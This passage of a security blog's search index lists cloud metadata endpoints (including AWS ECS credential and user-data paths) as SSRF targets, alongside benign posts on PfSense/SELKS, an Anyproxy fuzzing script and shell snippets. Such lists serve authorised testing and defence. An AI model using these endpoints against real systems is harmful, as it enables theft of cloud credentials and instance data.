Taskhttp://169.254.170.2/v2/credentials/ References\nhttp://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-metadata-endpoint-v2.html Azure No header Requiredhttp://169.254.169.254/metadata/v1/maintenance Requires headerMust use Metadata: true request header\nhttp://169.254.169.254/metadata/instance?api-version=2017-04-02 http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02\u0026format=text References\nhttps://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/ https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service Google Cloud Requires headerMust use one of the following headers\nMetadata-Flavor: Google X-Google-Metadata-Request: True http://169.254.169.254/computeMetadata/v1/ http://metadata.google.internal/computeMetadata/v1/ http://metadata/computeMetadata/v1/ http://metadata.google.internal/computeMetadata/v1/instance/hostname http://metadata.google.internal/computeMetadata/v1/instance/id http://metadata.google.internal/computeMetadata/v1/project/project-id http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true No header required (old)http://metadata.google.internal/computeMetadata/v1beta1/ References\nhttps://cloud.google.com/compute/docs/metadata Digital Oceanhttp://169.254.169.254/metadata/v1.json http://169.254.169.254/metadata/v1/ http://169.254.169.254/metadata/v1/id http://169.254.169.254/metadata/v1/user-data http://169.254.169.254/metadata/v1/hostname http://169.254.169.254/metadata/v1/region http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address References\nhttps://developers.digitalocean.com/documentation/metadata/ HP Helionhttp://169.254.169.254/2009-04-04/meta-data/ Kuberneteshttps://kubernetes.default https://kubernetes.default.svc.cluster.local https://kubernetes.default.svc/metrics References\nhttps://twitter.com/Random_Robbie/status/1072242182306832384 https://kubernetes.io/docs/tasks/debug-application-cluster/debug-service/ OpenStack/RackSpacehttp://169.254.169.254/openstack References\nhttps://docs.openstack.org/nova/latest/user/metadata-service.html Oracle Cloudhttp://192.0.0.192/latest/ http://192.0.0.192/latest/user-data/ http://192.0.0.192/latest/meta-data/ http://192.0.0.192/latest/attributes/ References\nhttps://docs.oracle.com/en/cloud/iaas/compute-iaas-cloud/stcsg/retrieving-instance-metadata.html Packetcloudhttps://metadata.packet.net/userdata ","categories":"","description":"","excerpt":" Alibabahttp://100.100.100.200/latest/meta-data/ …","ref":"/blog/2020/01/30/cloud-metadata-urls/","tags":["SSRF","hacking","cloud metadata URLs"],"title":"Cloud metadata URLs"},{"body":"","categories":"","description":"","excerpt":"","ref":"/tags/cloud-metadata-urls/","tags":"","title":"Cloud Metadata URLs"},{"body":"","categories":"","description":"","excerpt":"","ref":"/tags/hacking/","tags":"","title":"Hacking"},{"body":"","categories":"","description":"","excerpt":"","ref":"/tags/ssrf/","tags":"","title":"SSRF"},{"body":"","categories":"","description":"","excerpt":"","ref":"/tags/pfsense/","tags":"","title":"PfSense"},{"body":"I installed SELKS this in a VM. I am using Fedora Server (which I kind of regret because of the updates).\nOnce installed I went to my PfSense firewall admin interface, to bridge LAN and WAN to a 3rd interface ( OPT1). ref\nWAN + | | +--------------v----------------+ | | | | | PfSense | | | | | | | +---+--------------------+------+ | | | | | | v v LAN OPT1 (to SELKS Monitor port) PfSense logs in SELKS kibanaI used some files from here, then enabled log forwarding in pfsense\n","categories":"","description":"","excerpt":"I installed SELKS this in a VM. I am using Fedora Server (which I kind …","ref":"/blog/2019/04/23/pfsense-and-selks/","tags":["random","PfSense","SELKS"],"title":"PfSense and SELKS"},{"body":"","categories":"","description":"","excerpt":"","ref":"/tags/random/","tags":"","title":"Random"},{"body":"","categories":"","description":"","excerpt":"","ref":"/tags/selks/","tags":"","title":"SELKS"},{"body":"","categories":"","description":"","excerpt":"","ref":"/tags/anyproxy/","tags":"","title":"Anyproxy"},{"body":"Anyproxy is an intercept proxy. I used it to inject scripts into pages to assist in web fuzzing.\nconst AnyProxy = require('./anyproxy/proxy'); const options = { port: 8080, rule: require('./dfkt_rule'), webInterface: { enable: true, webPort: 8002 }, throttle: 10000, forceProxyHttps: true, wsIntercept: true, silent: false }; const proxyServer = new AnyProxy.ProxyServer(options); proxyServer.on('ready', () =\u003e { console.log('ready') }); proxyServer.on('error', (e) =\u003e { console.error(e) }); proxyServer.start(); //when finished // dfkt_rule let hooks = { beforeSendRequest: [ function (requestDetail, requestDetailModifications) { requestDetailModifications.requestOptions = requestDetail.requestOptions; requestDetailModifications.requestOptions.headers['User-Agent'] += ' DFKT/1'; }, ], beforeSendResponse: [ function (requestDetail, responseDetail, modifiedResponse) { modifiedResponse.response = responseDetail.response; console.log(modifiedResponse.response.header); if (modifiedResponse.response.body.indexOf('\u003chead\u003e') !== -1) { modifiedResponse.response.body = modifiedResponse.response.body.toString().replace('\u003chead\u003e', '\u003chead\u003e\u003cscript\u003econsole.log(\"dfkt loaded\")\u003c/script\u003e'); } }, ], } module.exports = { summary: 'DFKT rules for web testing', * beforeSendRequest(requestDetail) { let requestDetailModifications = {}; for (let hook in hooks.beforeSendRequest) { hooks.beforeSendRequest[hook](requestDetail, requestDetailModifications); } return requestDetailModifications; }, // deal response before send to client * beforeSendResponse(requestDetail, responseDetail) { let responseDetailModifications = {}; for (let hook in hooks.beforeSendResponse) { hooks.beforeSendResponse[hook](requestDetail, responseDetail, responseDetailModifications); } return responseDetailModifications; }, // // if deal https request // *beforeDealHttpsRequest(requestDetail) { // // }, // error happened when dealing requests * onError(requestDetail, error) { }, // error happened when connect to https server * onConnectError(requestDetail, error) { } }; ","categories":"","description":"","excerpt":"Anyproxy is an intercept proxy. I used it to inject scripts into pages …","ref":"/blog/2019/03/11/anyproxy-intercept/","tags":["random","not work","anyproxy"],"title":"Anyproxy Intercept"},{"body":"","categories":"","description":"","excerpt":"","ref":"/tags/not-work/","tags":"","title":"Not Work"},{"body":"Mass move:\nfor f in wlog/*; do for ff in $f/*; do cp \"$ff\" $(basename $f)-$(basename $ff | sed 's/^00-//g' | sed 's/ /-/g'); done; done Mass Find and replace:\nfor f in *todo*; do cat $f | sed -e 's/## '$(basename $f | sed 's/-stand-up-notes.md//')$'/---\\\\\\ndate: \"2019-03-01T16:20:01\" title: '$(basename $f | sed 's/-stand-up-notes.md//')$' stand up notes\\\\\\n---'/ | tee $f ; done Mass adjust markdown headers:\nfind . -name '*.md' | while read f; do cat $f | egrep '^##\\s' \u003e /dev/null \u0026\u0026 echo $f; done | while read fn; do cat $fn | sed 's/^##/###/g' | sed 's/^#\\s/## /g' | tee $fn; done Create temp directory:\ntmpDir=\"$(mktemp -d -t tmpdirname.XXXXXXXXXX || oops \"Can't create temporary directory\")\" cleanup() { rm -rf \"$tmpDir\" } trap cleanup EXIT INT QUIT TERM ","categories":"","description":"","excerpt":"Mass move:\nfor f in wlog/*; do for ff in $f/*; do cp \"$ff\" $(basename …","ref":"/blog/2019/03/01/random-shell-scripting-things-i-may-use-in-the-future/","tags":["random","shell script","not work"],"title":"Random shell scripting things I may use in the future"},{"body":"","categories":"","description":"","excerpt":"","ref":"/tags/shell-script/","tags":"","title":"Shell Script"},{"body":" About Me Offensive Security / Developer Twenty years ago I began learning to program in order to learn how to break programs. I have been building and breaking ever since. I love learning new things, writing code, and sharing my passion for security. This makes finding and exploiting software vulnerabilities extremely rewarding for me. I take pride in clean code, even if it is exploit code.\nProfessionally,I lead a small team of talented penetration testers. I oversee everything from scheduling to reporting. I am hands-on keyboard alongside my team and believe we can learn from each other every day. Engagements range from code review to full scope black box penetration tests.\nIn my spare time, I am learning new things and sharing that information here.\n","categories":"","description":"","excerpt":" About Me Offensive Security / Developer Twenty years ago I began …","ref":"/about/","tags":"","title":"About Defektive"},{"body":"A simple blog for random thought and updates.\n","categories":"","description":"","excerpt":"A simple blog for random thought and updates.\n","ref":"/blog/","tags":"","title":"Blog"},{"body":"","categories":"","description":"","excerpt":"","ref":"/categories/","tags":"","title":"Categories"},{"body":" Hello human! Learn Ramblings What is this place?\nThis site is an effort to document things I find interesting. I know I will forget them, but I can always come back and re-learn them. Hopefully this information is useful to others… If not, you could contribute improvement via a pull request.\nHow Guides! Over time I have learned to do some cool things. You can learn to do these cool things too. Hopefully with less friction than I experienced.\nLearn Ramblings / Updates A flow of thoughts in the form of blog posts.\nRead more\nContributions welcome! We do a Pull Request contributions workflow on GitHub. New users are always welcome!\nRead more\nOther projects I contribute to\nAnalog Substance on GitHub Offensive security related tools\nAnalog Substance This space for rent! I may have affiliate links on here at some point, but I do not want any ads…. except maybe this one.\nRead more\nEnjoyed my content? Or maybe you just like me?\n","categories":"","description":"","excerpt":" Hello human! Learn Ramblings What is this place?\nThis site is an …","ref":"/","tags":"","title":"defektive"},{"body":"","categories":"","description":"","excerpt":"","ref":"/tags/domain-takeover/","tags":"","title":"Domain Takeover"},{"body":"","categories":"","description":"","excerpt":"","ref":"/categories/how-to/","tags":"","title":"How To"},{"body":" A collection of learning resources for increasing one’s knowledge.\nThis section will always be a WIP. If you notice an error in any of this content, please let me know via an issue on GitHub (or correct it using a pull request).\nThanks!\n","categories":"","description":"","excerpt":" A collection of learning resources for increasing one’s knowledge. …","ref":"/docs/","tags":"","title":"How to Guides"},{"body":"","categories":"","description":"","excerpt":"","ref":"/search/","tags":"","title":"Search Results"}]